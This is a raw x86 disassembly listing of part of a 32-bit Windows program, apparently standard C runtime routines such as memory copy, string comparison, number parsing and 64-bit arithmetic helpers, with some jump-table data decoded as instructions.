  4284b3:	jmp    DWORD PTR [edx*4+0x4284bc]
  4284ba:	mov    edi,edi
  4284bc:	int3   
  4284bd:	test   BYTE PTR [edx+0x0],al
  4284c0:	aam    0x84
  4284c2:	inc    edx
  4284c3:	add    al,ah
  4284c5:	test   BYTE PTR [edx+0x0],al
  4284c8:	hlt    
  4284c9:	test   BYTE PTR [edx+0x0],al
  4284cc:	mov    eax,DWORD PTR [ebp+0x8]
  4284cf:	pop    esi
  4284d0:	pop    edi
  4284d1:	leave  
  4284d2:	ret    
  4284d3:	nop
  4284d4:	mov    al,BYTE PTR [esi]
  4284d6:	mov    BYTE PTR [edi],al
  4284d8:	mov    eax,DWORD PTR [ebp+0x8]
  4284db:	pop    esi
  4284dc:	pop    edi
  4284dd:	leave  
  4284de:	ret    
  4284df:	nop
  4284e0:	mov    al,BYTE PTR [esi]
  4284e2:	mov    BYTE PTR [edi],al
  4284e4:	mov    al,BYTE PTR [esi+0x1]
  4284e7:	mov    BYTE PTR [edi+0x1],al
  4284ea:	mov    eax,DWORD PTR [ebp+0x8]
  4284ed:	pop    esi
  4284ee:	pop    edi
  4284ef:	leave  
  4284f0:	ret    
  4284f1:	lea    ecx,[ecx+0x0]
  4284f4:	mov    al,BYTE PTR [esi]
  4284f6:	mov    BYTE PTR [edi],al
  4284f8:	mov    al,BYTE PTR [esi+0x1]
  4284fb:	mov    BYTE PTR [edi+0x1],al
  4284fe:	mov    al,BYTE PTR [esi+0x2]
  428501:	mov    BYTE PTR [edi+0x2],al
  428504:	mov    eax,DWORD PTR [ebp+0x8]
  428507:	pop    esi
  428508:	pop    edi
  428509:	leave  
  42850a:	ret    
  42850b:	nop
  42850c:	lea    esi,[ecx+esi*1-0x4]
  428510:	lea    edi,[ecx+edi*1-0x4]
  428514:	test   edi,0x3
  42851a:	jne    0x428540
  42851c:	shr    ecx,0x2
  42851f:	and    edx,0x3
  428522:	cmp    ecx,0x8
  428525:	jb     0x428534
  428527:	std    
  428528:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42852a:	cld    
  42852b:	jmp    DWORD PTR [edx*4+0x428658]
  428532:	mov    edi,edi
  428534:	neg    ecx
  428536:	jmp    DWORD PTR [ecx*4+0x428608]
  42853d:	lea    ecx,[ecx+0x0]
  428540:	mov    eax,edi
  428542:	mov    edx,0x3
  428547:	cmp    ecx,0x4
  42854a:	jb     0x428558
  42854c:	and    eax,0x3
  42854f:	sub    ecx,eax
  428551:	jmp    DWORD PTR [eax*4+0x42855c]
  428558:	jmp    DWORD PTR [ecx*4+0x428658]
  42855f:	nop
  428560:	ins    BYTE PTR es:[edi],dx
  428561:	test   DWORD PTR [edx+0x0],eax
  428564:	nop
  428565:	test   DWORD PTR [edx+0x0],eax
  428568:	mov    eax,0x8a004285
  42856d:	inc    esi
  42856e:	add    esp,DWORD PTR [ebx]
  428570:	ror    DWORD PTR [eax-0x117cfcb9],1
  428576:	add    ecx,eax
  428578:	jmp    0x232087f
  42857d:	cmp    ecx,0x8
  428580:	jb     0x428534
  428582:	std    
  428583:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  428585:	cld    
  428586:	jmp    DWORD PTR [edx*4+0x428658]
  42858d:	lea    ecx,[ecx+0x0]
  428590:	mov    al,BYTE PTR [esi+0x3]
  428593:	and    edx,ecx
  428595:	mov    BYTE PTR [edi+0x3],al
  428598:	mov    al,BYTE PTR [esi+0x2]
  42859b:	shr    ecx,0x2
  42859e:	mov    BYTE PTR [edi+0x2],al
  4285a1:	sub    esi,0x2
  4285a4:	sub    edi,0x2
  4285a7:	cmp    ecx,0x8
  4285aa:	jb     0x428534
  4285ac:	std    
  4285ad:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4285af:	cld    
  4285b0:	jmp    DWORD PTR [edx*4+0x428658]
  4285b7:	nop
  4285b8:	mov    al,BYTE PTR [esi+0x3]
  4285bb:	and    edx,ecx
  4285bd:	mov    BYTE PTR [edi+0x3],al
  4285c0:	mov    al,BYTE PTR [esi+0x2]
  4285c3:	mov    BYTE PTR [edi+0x2],al
  4285c6:	mov    al,BYTE PTR [esi+0x1]
  4285c9:	shr    ecx,0x2
  4285cc:	mov    BYTE PTR [edi+0x1],al
  4285cf:	sub    esi,0x3
  4285d2:	sub    edi,0x3
  4285d5:	cmp    ecx,0x8
  4285d8:	jb     0x428534
  4285de:	std    
  4285df:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4285e1:	cld    
  4285e2:	jmp    DWORD PTR [edx*4+0x428658]
  4285e9:	lea    ecx,[ecx+0x0]
  4285ec:	or     al,0x86
  4285ee:	inc    edx
  4285ef:	add    BYTE PTR [esi+eax*4],dl
  4285f2:	inc    edx
  4285f3:	add    BYTE PTR [esi+eax*4],bl
  4285f6:	inc    edx
  4285f7:	add    BYTE PTR [esi+eax*4],ah
  4285fa:	inc    edx
  4285fb:	add    BYTE PTR [esi+eax*4],ch
  4285fe:	inc    edx
  4285ff:	add    BYTE PTR [esi+eax*4],dh
  428602:	inc    edx
  428603:	add    BYTE PTR [esi+eax*4],bh
  428606:	inc    edx
  428607:	add    BYTE PTR [edi-0x7a],cl
  42860a:	inc    edx
  42860b:	add    BYTE PTR [ebx-0x76e371bc],cl
  428611:	inc    esp
  428612:	(bad)  
  428613:	sbb    al,0x8b
  428615:	inc    esp
  428616:	mov    ds,WORD PTR [eax]
  428618:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  42861c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  428620:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  428624:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  428628:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  42862c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  428630:	mov    DWORD PTR [edi+ecx*4+0xc],eax
  428634:	mov    eax,DWORD PTR [esi+ecx*4+0x8]
  428638:	mov    DWORD PTR [edi+ecx*4+0x8],eax
  42863c:	mov    eax,DWORD PTR [esi+ecx*4+0x4]
  428640:	mov    DWORD PTR [edi+ecx*4+0x4],eax
  428644:	lea    eax,[ecx*4+0x0]
  42864b:	add    esi,eax
  42864d:	add    edi,eax
  42864f:	jmp    DWORD PTR [edx*4+0x428658]
  428656:	mov    edi,edi
  428658:	push   0x70004286
  42865d:	xchg   BYTE PTR [edx+0x0],al
  428660:	add    BYTE PTR [esi-0x796bffbe],0x42
  428667:	add    BYTE PTR [ebx+0x5f5e0845],cl
  42866d:	leave  
  42866e:	ret    
  42866f:	nop
  428670:	mov    al,BYTE PTR [esi+0x3]
  428673:	mov    BYTE PTR [edi+0x3],al
  428676:	mov    eax,DWORD PTR [ebp+0x8]
  428679:	pop    esi
  42867a:	pop    edi
  42867b:	leave  
  42867c:	ret    
  42867d:	lea    ecx,[ecx+0x0]
  428680:	mov    al,BYTE PTR [esi+0x3]
  428683:	mov    BYTE PTR [edi+0x3],al
  428686:	mov    al,BYTE PTR [esi+0x2]
  428689:	mov    BYTE PTR [edi+0x2],al
  42868c:	mov    eax,DWORD PTR [ebp+0x8]
  42868f:	pop    esi
  428690:	pop    edi
  428691:	leave  
  428692:	ret    
  428693:	nop
  428694:	mov    al,BYTE PTR [esi+0x3]
  428697:	mov    BYTE PTR [edi+0x3],al
  42869a:	mov    al,BYTE PTR [esi+0x2]
  42869d:	mov    BYTE PTR [edi+0x2],al
  4286a0:	mov    al,BYTE PTR [esi+0x1]
  4286a3:	mov    BYTE PTR [edi+0x1],al
  4286a6:	mov    eax,DWORD PTR [ebp+0x8]
  4286a9:	pop    esi
  4286aa:	pop    edi
  4286ab:	leave  
  4286ac:	ret    
  4286ad:	push   ebp
  4286ae:	mov    ebp,esp
  4286b0:	sub    esp,0xc
  4286b3:	mov    eax,ds:0x462f30
  4286b8:	xor    eax,DWORD PTR [ebp+0x4]
  4286bb:	and    BYTE PTR [ebp-0x6],0x0
  4286bf:	push   0x6
  4286c1:	mov    DWORD PTR [ebp-0x4],eax
  4286c4:	lea    eax,[ebp-0xc]
  4286c7:	push   eax
  4286c8:	push   0x1004
  4286cd:	push   DWORD PTR [ebp+0x8]
  4286d0:	call   DWORD PTR ds:0x429138
  4286d6:	test   eax,eax
  4286d8:	jne    0x4286df
  4286da:	or     eax,0xffffffff
  4286dd:	jmp    0x4286e9
  4286df:	lea    eax,[ebp-0xc]
  4286e2:	push   eax
  4286e3:	call   0x4289ee
  4286e8:	pop    ecx
  4286e9:	mov    ecx,DWORD PTR [ebp-0x4]
  4286ec:	xor    ecx,DWORD PTR [ebp+0x4]
  4286ef:	call   0x425afc
  4286f4:	leave  
  4286f5:	ret    
  4286f6:	push   0x38
  4286f8:	push   0x42a000
  4286fd:	call   0x425434
  428702:	mov    eax,ds:0x462f30
  428707:	xor    eax,DWORD PTR [ebp+0x4]
  42870a:	mov    DWORD PTR [ebp-0x1c],eax
  42870d:	xor    edi,edi
  42870f:	mov    DWORD PTR [ebp-0x20],edi
  428712:	mov    DWORD PTR [ebp-0x24],edi
  428715:	mov    eax,DWORD PTR [ebp+0x14]
  428718:	mov    ebx,DWORD PTR [eax]
  42871a:	mov    DWORD PTR [ebp-0x28],ebx
  42871d:	mov    DWORD PTR [ebp-0x2c],edi
  428720:	mov    eax,DWORD PTR [ebp+0x8]
  428723:	cmp    eax,DWORD PTR [ebp+0xc]
  428726:	je     0x42889f
  42872c:	lea    ecx,[ebp-0x40]
  42872f:	push   ecx
  428730:	push   eax
  428731:	mov    esi,DWORD PTR ds:0x429104
  428737:	call   esi
  428739:	test   eax,eax
  42873b:	je     0x42875d
  42873d:	cmp    DWORD PTR [ebp-0x40],0x1
  428741:	jne    0x42875d
  428743:	lea    eax,[ebp-0x40]
  428746:	push   eax
  428747:	push   DWORD PTR [ebp+0xc]
  42874a:	call   esi
  42874c:	test   eax,eax
  42874e:	je     0x42875d
  428750:	cmp    DWORD PTR [ebp-0x40],0x1
  428754:	jne    0x42875d
  428756:	mov    DWORD PTR [ebp-0x2c],0x1
  42875d:	cmp    DWORD PTR [ebp-0x2c],edi
  428760:	je     0x42877c
  428762:	cmp    ebx,0xffffffff
  428765:	je     0x42876b
  428767:	mov    esi,ebx
  428769:	jmp    0x428777
  42876b:	push   DWORD PTR [ebp+0x10]
  42876e:	call   0x425a40
  428773:	pop    ecx
  428774:	mov    esi,eax
  428776:	inc    esi
  428777:	mov    DWORD PTR [ebp-0x44],esi
  42877a:	jmp    0x42877f
  42877c:	mov    esi,DWORD PTR [ebp-0x44]
  42877f:	cmp    DWORD PTR [ebp-0x2c],edi
  428782:	jne    0x42879e
  428784:	push   edi
  428785:	push   edi
  428786:	push   ebx
  428787:	push   DWORD PTR [ebp+0x10]
  42878a:	push   0x1
  42878c:	push   DWORD PTR [ebp+0x8]
  42878f:	call   DWORD PTR ds:0x429128
  428795:	mov    esi,eax
  428797:	mov    DWORD PTR [ebp-0x44],esi
  42879a:	cmp    esi,edi
  42879c:	je     0x4287f6
  42879e:	mov    DWORD PTR [ebp-0x4],edi
  4287a1:	lea    eax,[esi+esi*1]
  4287a4:	add    eax,0x3
  4287a7:	and    eax,0xfffffffc
  4287aa:	call   0x425480
  4287af:	mov    DWORD PTR [ebp-0x18],esp
  4287b2:	mov    ebx,esp
  4287b4:	mov    DWORD PTR [ebp-0x48],ebx
  4287b7:	lea    eax,[esi+esi*1]
  4287ba:	push   eax
  4287bb:	push   edi
  4287bc:	push   ebx
  4287bd:	call   0x427d30
  4287c2:	add    esp,0xc
  4287c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4287c9:	jmp    0x4287e2
  4287cb:	xor    eax,eax
  4287cd:	inc    eax
  4287ce:	ret    
  4287cf:	mov    esp,DWORD PTR [ebp-0x18]
  4287d2:	call   0x4288c5
  4287d7:	xor    edi,edi
  4287d9:	xor    ebx,ebx
  4287db:	or     DWORD PTR [ebp-0x4],0xffffffff
  4287df:	mov    esi,DWORD PTR [ebp-0x44]
  4287e2:	cmp    ebx,edi
  4287e4:	jne    0x428804
  4287e6:	push   esi
  4287e7:	push   0x2
  4287e9:	call   0x426548
  4287ee:	pop    ecx
  4287ef:	pop    ecx
  4287f0:	mov    ebx,eax
  4287f2:	cmp    ebx,edi
  4287f4:	jne    0x4287fd
  4287f6:	xor    eax,eax
  4287f8:	jmp    0x4288b1
  4287fd:	mov    DWORD PTR [ebp-0x24],0x1
  428804:	push   esi
  428805:	push   ebx
  428806:	push   DWORD PTR [ebp-0x28]
  428809:	push   DWORD PTR [ebp+0x10]
  42880c:	push   0x1
  42880e:	push   DWORD PTR [ebp+0x8]
  428811:	call   DWORD PTR ds:0x429128
  428817:	test   eax,eax
  428819:	je     0x4288a2
  42881f:	cmp    DWORD PTR [ebp+0x18],edi
  428822:	je     0x428844
  428824:	push   edi
  428825:	push   edi
  428826:	push   DWORD PTR [ebp+0x1c]
  428829:	push   DWORD PTR [ebp+0x18]
  42882c:	push   esi
  42882d:	push   ebx
  42882e:	push   edi
  42882f:	push   DWORD PTR [ebp+0xc]
  428832:	call   DWORD PTR ds:0x4290bc
  428838:	test   eax,eax
  42883a:	je     0x4288a2
  42883c:	mov    eax,DWORD PTR [ebp+0x18]
  42883f:	mov    DWORD PTR [ebp-0x20],eax
  428842:	jmp    0x4288a2
  428844:	cmp    DWORD PTR [ebp-0x2c],edi
  428847:	jne    0x42885f
  428849:	push   edi
  42884a:	push   edi
  42884b:	push   edi
  42884c:	push   edi
  42884d:	push   esi
  42884e:	push   ebx
  42884f:	push   edi
  428850:	push   DWORD PTR [ebp+0xc]
  428853:	call   DWORD PTR ds:0x4290bc
  428859:	mov    esi,eax
  42885b:	cmp    esi,edi
  42885d:	je     0x4288a2
  42885f:	push   esi
  428860:	push   0x1
  428862:	call   0x426548
  428867:	pop    ecx
  428868:	pop    ecx
  428869:	mov    DWORD PTR [ebp-0x20],eax
  42886c:	cmp    eax,edi
  42886e:	je     0x4288a2
  428870:	push   edi
  428871:	push   edi
  428872:	push   esi
  428873:	push   eax
  428874:	push   esi
  428875:	push   ebx
  428876:	push   edi
  428877:	push   DWORD PTR [ebp+0xc]
  42887a:	call   DWORD PTR ds:0x4290bc
  428880:	cmp    eax,edi
  428882:	jne    0x428892
  428884:	push   DWORD PTR [ebp-0x20]
  428887:	call   0x42603a
  42888c:	pop    ecx
  42888d:	mov    DWORD PTR [ebp-0x20],edi
  428890:	jmp    0x4288a2
  428892:	cmp    DWORD PTR [ebp-0x28],0xffffffff
  428896:	je     0x4288a2
  428898:	mov    ecx,DWORD PTR [ebp+0x14]
  42889b:	mov    DWORD PTR [ecx],eax
  42889d:	jmp    0x4288a2
  42889f:	mov    ebx,DWORD PTR [ebp-0x48]
  4288a2:	cmp    DWORD PTR [ebp-0x24],edi
  4288a5:	je     0x4288ae
  4288a7:	push   ebx
  4288a8:	call   0x42603a
  4288ad:	pop    ecx
  4288ae:	mov    eax,DWORD PTR [ebp-0x20]
  4288b1:	lea    esp,[ebp-0x54]
  4288b4:	mov    ecx,DWORD PTR [ebp-0x1c]
  4288b7:	xor    ecx,DWORD PTR [ebp+0x4]
  4288ba:	call   0x425afc
  4288bf:	call   0x42546f
  4288c4:	ret    
  4288c5:	push   ebp
  4288c6:	mov    ebp,esp
  4288c8:	sub    esp,0x48
  4288cb:	push   ebx
  4288cc:	push   esi
  4288cd:	push   edi
  4288ce:	push   0x4
  4288d0:	pop    eax
  4288d1:	call   0x425480
  4288d6:	mov    ebx,esp
  4288d8:	push   0x1c
  4288da:	lea    eax,[ebp-0x24]
  4288dd:	push   eax
  4288de:	push   ebx
  4288df:	call   DWORD PTR ds:0x429054
  4288e5:	test   eax,eax
  4288e7:	je     0x42895a
  4288e9:	mov    edi,DWORD PTR [ebp-0x20]
  4288ec:	lea    eax,[ebp-0x48]
  4288ef:	push   eax
  4288f0:	call   DWORD PTR ds:0x42908c
  4288f6:	mov    eax,DWORD PTR [ebp-0x44]
  4288f9:	lea    esi,[eax-0x1]
  4288fc:	not    esi
  4288fe:	and    esi,ebx
  428900:	sub    esi,eax
  428902:	mov    DWORD PTR [ebp-0x4],eax
  428905:	mov    eax,ds:0x4635c4
  42890a:	mov    ecx,eax
  42890c:	dec    ecx
  42890d:	neg    ecx
  42890f:	sbb    ecx,ecx
  428911:	and    ecx,0xffff1000
  428917:	add    ecx,0x11000
  42891d:	add    ecx,edi
  42891f:	cmp    esi,ecx
  428921:	jb     0x42895a
  428923:	cmp    eax,0x1
  428926:	je     0x428972
  428928:	mov    ebx,edi
  42892a:	mov    edi,0x1000
  42892f:	push   0x1c
  428931:	lea    eax,[ebp-0x24]
  428934:	push   eax
  428935:	push   ebx
  428936:	call   DWORD PTR ds:0x429054
  42893c:	test   eax,eax
  42893e:	je     0x42895a
  428940:	add    ebx,DWORD PTR [ebp-0x18]
  428943:	test   DWORD PTR [ebp-0x14],edi
  428946:	je     0x42892f
  428948:	test   BYTE PTR [ebp-0xf],0x1
  42894c:	mov    ebx,DWORD PTR [ebp-0x24]
  42894f:	je     0x428956
  428951:	xor    eax,eax
  428953:	inc    eax
  428954:	jmp    0x42898e
  428956:	cmp    esi,ebx
  428958:	jae    0x42895e
  42895a:	xor    eax,eax
  42895c:	jmp    0x42898e
  42895e:	push   0x4
  428960:	push   edi
  428961:	push   DWORD PTR [ebp-0x4]
  428964:	push   ebx
  428965:	call   DWORD PTR ds:0x429058
  42896b:	mov    eax,ds:0x4635c4
  428970:	jmp    0x428974
  428972:	mov    ebx,esi
  428974:	dec    eax
  428975:	neg    eax
  428977:	sbb    eax,eax
  428979:	and    eax,0x103
  42897e:	lea    ecx,[ebp-0x8]
  428981:	push   ecx
  428982:	inc    eax
  428983:	push   eax
  428984:	push   DWORD PTR [ebp-0x4]
  428987:	push   ebx
  428988:	call   DWORD PTR ds:0x42906c
  42898e:	lea    esp,[ebp-0x54]
  428991:	pop    edi
  428992:	pop    esi
  428993:	pop    ebx
  428994:	leave  
  428995:	ret    
  428996:	int3   
  428997:	int3   
  428998:	int3   
  428999:	int3   
  42899a:	int3   
  42899b:	int3   
  42899c:	int3   
  42899d:	int3   
  42899e:	int3   
  42899f:	int3   
  4289a0:	push   ebp
  4289a1:	mov    ebp,esp
  4289a3:	push   edi
  4289a4:	push   esi
  4289a5:	push   ebx
  4289a6:	mov    esi,DWORD PTR [ebp+0xc]
  4289a9:	mov    edi,DWORD PTR [ebp+0x8]
  4289ac:	mov    al,0xff
  4289ae:	mov    edi,edi
  4289b0:	or     al,al
  4289b2:	je     0x4289e6
  4289b4:	mov    al,BYTE PTR [esi]
  4289b6:	add    esi,0x1
  4289b9:	mov    ah,BYTE PTR [edi]
  4289bb:	add    edi,0x1
  4289be:	cmp    ah,al
  4289c0:	je     0x4289b0
  4289c2:	sub    al,0x41
  4289c4:	cmp    al,0x1a
  4289c6:	sbb    cl,cl
  4289c8:	and    cl,0x20
  4289cb:	add    al,cl
  4289cd:	add    al,0x41
  4289cf:	xchg   al,ah
  4289d1:	sub    al,0x41
  4289d3:	cmp    al,0x1a
  4289d5:	sbb    cl,cl
  4289d7:	and    cl,0x20
  4289da:	add    al,cl
  4289dc:	add    al,0x41
  4289de:	cmp    al,ah
  4289e0:	je     0x4289b0
  4289e2:	sbb    al,al
  4289e4:	sbb    al,0xff
  4289e6:	movsx  eax,al
  4289e9:	pop    ebx
  4289ea:	pop    esi
  4289eb:	pop    edi
  4289ec:	leave  
  4289ed:	ret    
  4289ee:	push   esi
  4289ef:	push   edi
  4289f0:	call   0x4252e9
  4289f5:	mov    edi,DWORD PTR [eax+0x64]
  4289f8:	cmp    edi,DWORD PTR ds:0x46308c
  4289fe:	je     0x428a07
  428a00:	call   0x42678f
  428a05:	mov    edi,eax
  428a07:	mov    esi,DWORD PTR [esp+0xc]
  428a0b:	cmp    DWORD PTR [edi+0x28],0x1
  428a0f:	movzx  eax,BYTE PTR [esi]
  428a12:	jle    0x428a22
  428a14:	push   0x8
  428a16:	push   eax
  428a17:	push   edi
  428a18:	call   0x428a76
  428a1d:	add    esp,0xc
  428a20:	jmp    0x428a2c
  428a22:	mov    ecx,DWORD PTR [edi+0x48]
  428a25:	movzx  eax,BYTE PTR [ecx+eax*2]
  428a29:	and    eax,0x8
  428a2c:	test   eax,eax
  428a2e:	je     0x428a33
  428a30:	inc    esi
  428a31:	jmp    0x428a0b
  428a33:	movzx  ecx,BYTE PTR [esi]
  428a36:	inc    esi
  428a37:	cmp    ecx,0x2d
  428a3a:	mov    edx,ecx
  428a3c:	je     0x428a43
  428a3e:	cmp    ecx,0x2b
  428a41:	jne    0x428a47
  428a43:	movzx  ecx,BYTE PTR [esi]
  428a46:	inc    esi
  428a47:	xor    eax,eax
  428a49:	cmp    ecx,0x30
  428a4c:	jl     0x428a58
  428a4e:	cmp    ecx,0x39
  428a51:	jg     0x428a58
  428a53:	sub    ecx,0x30
  428a56:	jmp    0x428a5b
  428a58:	or     ecx,0xffffffff
  428a5b:	cmp    ecx,0xffffffff
  428a5e:	je     0x428a6c
  428a60:	lea    eax,[eax+eax*4]
  428a63:	lea    eax,[ecx+eax*2]
  428a66:	movzx  ecx,BYTE PTR [esi]
  428a69:	inc    esi
  428a6a:	jmp    0x428a49
  428a6c:	cmp    edx,0x2d
  428a6f:	pop    edi
  428a70:	pop    esi
  428a71:	jne    0x428a75
  428a73:	neg    eax
  428a75:	ret    
  428a76:	push   ebp
  428a77:	mov    ebp,esp
  428a79:	push   ecx
  428a7a:	mov    eax,DWORD PTR [ebp+0xc]
  428a7d:	lea    ecx,[eax+0x1]
  428a80:	cmp    ecx,0x100
  428a86:	mov    ecx,DWORD PTR [ebp+0x8]
  428a89:	ja     0x428a94
  428a8b:	mov    ecx,DWORD PTR [ecx+0x48]
  428a8e:	movzx  eax,WORD PTR [ecx+eax*2]
  428a92:	jmp    0x428ae8
  428a94:	push   esi
  428a95:	mov    edx,eax
  428a97:	sar    edx,0x8
  428a9a:	push   edi
  428a9b:	mov    edi,DWORD PTR [ecx+0x48]
  428a9e:	movzx  esi,dl
  428aa1:	test   BYTE PTR [edi+esi*2+0x1],0x80
  428aa6:	pop    edi
  428aa7:	pop    esi
  428aa8:	je     0x428ab9
  428aaa:	and    BYTE PTR [ebp-0x2],0x0
  428aae:	push   0x2
  428ab0:	mov    BYTE PTR [ebp-0x3],al
  428ab3:	mov    BYTE PTR [ebp-0x4],dl
  428ab6:	pop    eax
  428ab7:	jmp    0x428ac3
  428ab9:	and    BYTE PTR [ebp-0x3],0x0
  428abd:	mov    BYTE PTR [ebp-0x4],al
  428ac0:	xor    eax,eax
  428ac2:	inc    eax
  428ac3:	push   0x1
  428ac5:	push   DWORD PTR [ecx+0x14]
  428ac8:	push   DWORD PTR [ecx+0x4]
  428acb:	lea    ecx,[ebp+0xe]
  428ace:	push   ecx
  428acf:	push   eax
  428ad0:	lea    eax,[ebp-0x4]
  428ad3:	push   eax
  428ad4:	push   0x1
  428ad6:	call   0x427b58
  428adb:	add    esp,0x1c
  428ade:	test   eax,eax
  428ae0:	jne    0x428ae4
  428ae2:	leave  
  428ae3:	ret    
  428ae4:	movzx  eax,WORD PTR [ebp+0xe]
  428ae8:	and    eax,DWORD PTR [ebp+0x10]
  428aeb:	leave  
  428aec:	ret    
  428aed:	int3   
  428aee:	int3   
  428aef:	int3   
  428af0:	mov    eax,DWORD PTR [esp+0x8]
  428af4:	mov    ecx,DWORD PTR [esp+0x10]
  428af8:	or     ecx,eax
  428afa:	mov    ecx,DWORD PTR [esp+0xc]
  428afe:	jne    0x428b09
  428b00:	mov    eax,DWORD PTR [esp+0x4]
  428b04:	mul    ecx
  428b06:	ret    0x10
  428b09:	push   ebx
  428b0a:	mul    ecx
  428b0c:	mov    ebx,eax
  428b0e:	mov    eax,DWORD PTR [esp+0x8]
  428b12:	mul    DWORD PTR [esp+0x14]
  428b16:	add    ebx,eax
  428b18:	mov    eax,DWORD PTR [esp+0x8]
  428b1c:	mul    ecx
  428b1e:	add    edx,ebx
  428b20:	pop    ebx
  428b21:	ret    0x10
  428b24:	int3   
  428b25:	int3   
  428b26:	int3   
  428b27:	int3   
  428b28:	int3   
  428b29:	int3   
  428b2a:	int3   
  428b2b:	int3   
  428b2c:	int3   
  428b2d:	int3   
  428b2e:	int3   
  428b2f:	int3   
  428b30:	push   ebp
  428b31:	mov    ebp,esp
  428b33:	push   edi
  428b34:	push   esi
  428b35:	push   ebx
  428b36:	mov    ecx,DWORD PTR [ebp+0x10]
  428b39:	or     ecx,ecx
  428b3b:	je     0x428b8a
  428b3d:	mov    esi,DWORD PTR [ebp+0x8]
  428b40:	mov    edi,DWORD PTR [ebp+0xc]
  428b43:	mov    bh,0x41
  428b45:	mov    bl,0x5a
  428b47:	mov    dh,0x20
  428b49:	lea    ecx,[ecx+0x0]
  428b4c:	mov    ah,BYTE PTR [esi]
  428b4e:	or     ah,ah
  428b50:	mov    al,BYTE PTR [edi]
  428b52:	je     0x428b7b
  428b54:	or     al,al
  428b56:	je     0x428b7b
  428b58:	add    esi,0x1
  428b5b:	add    edi,0x1
  428b5e:	cmp    ah,bh
  428b60:	jb     0x428b68
  428b62:	cmp    ah,bl
  428b64:	ja     0x428b68
  428b66:	add    ah,dh
  428b68:	cmp    al,bh
  428b6a:	jb     0x428b72
  428b6c:	cmp    al,bl
  428b6e:	ja     0x428b72
  428b70:	add    al,dh
  428b72:	cmp    ah,al
  428b74:	jne    0x428b81
  428b76:	sub    ecx,0x1
  428b79:	jne    0x428b4c
  428b7b:	xor    ecx,ecx
  428b7d:	cmp    ah,al
  428b7f:	je     0x428b8a
  428b81:	mov    ecx,0xffffffff
  428b86:	jb     0x428b8a
  428b88:	neg    ecx
  428b8a:	mov    eax,ecx
  428b8c:	pop    ebx
  428b8d:	pop    esi
  428b8e:	pop    edi
  428b8f:	leave  
  428b90:	ret    
  428b91:	int3   
  428b92:	int3   
  428b93:	int3   
  428b94:	int3   
  428b95:	int3   
  428b96:	int3   
  428b97:	int3   
  428b98:	int3   
  428b99:	int3   
  428b9a:	int3   
  428b9b:	int3   
  428b9c:	int3   
  428b9d:	int3   
  428b9e:	int3   
  428b9f:	int3   
  428ba0:	push   esi
  428ba1:	mov    eax,DWORD PTR [esp+0x14]
  428ba5:	or     eax,eax
  428ba7:	jne    0x428bd1
  428ba9:	mov    ecx,DWORD PTR [esp+0x10]
  428bad:	mov    eax,DWORD PTR [esp+0xc]
  428bb1:	xor    edx,edx
  428bb3:	div    ecx
  428bb5:	mov    ebx,eax
  428bb7:	mov    eax,DWORD PTR [esp+0x8]
  428bbb:	div    ecx
  428bbd:	mov    esi,eax
  428bbf:	mov    eax,ebx
  428bc1:	mul    DWORD PTR [esp+0x10]
  428bc5:	mov    ecx,eax
  428bc7:	mov    eax,esi
  428bc9:	mul    DWORD PTR [esp+0x10]
  428bcd:	add    edx,ecx
  428bcf:	jmp    0x428c18
  428bd1:	mov    ecx,eax
  428bd3:	mov    ebx,DWORD PTR [esp+0x10]
  428bd7:	mov    edx,DWORD PTR [esp+0xc]
  428bdb:	mov    eax,DWORD PTR [esp+0x8]
  428bdf:	shr    ecx,1
  428be1:	rcr    ebx,1
  428be3:	shr    edx,1
  428be5:	rcr    eax,1
  428be7:	or     ecx,ecx
  428be9:	jne    0x428bdf
  428beb:	div    ebx
  428bed:	mov    esi,eax
  428bef:	mul    DWORD PTR [esp+0x14]
  428bf3:	mov    ecx,eax
  428bf5:	mov    eax,DWORD PTR [esp+0x10]
  428bf9:	mul    esi
  428bfb:	add    edx,ecx
  428bfd:	jb     0x428c0d
  428bff:	cmp    edx,DWORD PTR [esp+0xc]
  428c03:	ja     0x428c0d
  428c05:	jb     0x428c16
  428c07:	cmp    eax,DWORD PTR [esp+0x8]
  428c0b:	jbe    0x428c16
  428c0d:	dec    esi
  428c0e:	sub    eax,DWORD PTR [esp+0x10]
  428c12:	sbb    edx,DWORD PTR [esp+0x14]
  428c16:	xor    ebx,ebx
  428c18:	sub    eax,DWORD PTR [esp+0x8]
  428c1c:	sbb    edx,DWORD PTR [esp+0xc]
  428c20:	neg    edx
  428c22:	neg    eax
  428c24:	sbb    edx,0x0
  428c27:	mov    ecx,edx
  428c29:	mov    edx,ebx
  428c2b:	mov    ebx,ecx
  428c2d:	mov    ecx,eax
  428c2f:	mov    eax,esi
  428c31:	pop    esi
  428c32:	ret    0x10
  428c35:	int3   
  428c36:	int3   
  428c37:	int3   
  428c38:	int3   
  428c39:	int3   
  428c3a:	int3   
  428c3b:	int3   
  428c3c:	int3   
  428c3d:	int3   
  428c3e:	int3   
  428c3f:	int3   
  428c40:	lea    eax,[edx-0x1]
  428c43:	pop    ebx
  428c44:	ret    
  428c45:	lea    esp,[esp+0x0]
  428c4c:	lea    esp,[esp+0x0]
  428c50:	xor    eax,eax
  428c52:	mov    al,BYTE PTR [esp+0x8]
  428c56:	push   ebx
  428c57:	mov    ebx,eax
  428c59:	shl    eax,0x8
  428c5c:	mov    edx,DWORD PTR [esp+0x8]
  428c60:	test   edx,0x3
  428c66:	je     0x428c7d
  428c68:	mov    cl,BYTE PTR [edx]
  428c6a:	add    edx,0x1
  428c6d:	cmp    cl,bl
  428c6f:	je     0x428c40
  428c71:	test   cl,cl
  428c73:	je     0x428cc6
  428c75:	test   edx,0x3
  428c7b:	jne    0x428c68
  428c7d:	or     ebx,eax
  428c7f:	push   edi
  428c80:	mov    eax,ebx
  428c82:	shl    ebx,0x10
  428c85:	push   esi
  428c86:	or     ebx,eax
  428c88:	mov    ecx,DWORD PTR [edx]
  428c8a:	mov    edi,0x7efefeff
  428c8f:	mov    eax,ecx
  428c91:	mov    esi,edi
  428c93:	xor    ecx,ebx
  428c95:	add    esi,eax
  428c97:	add    edi,ecx
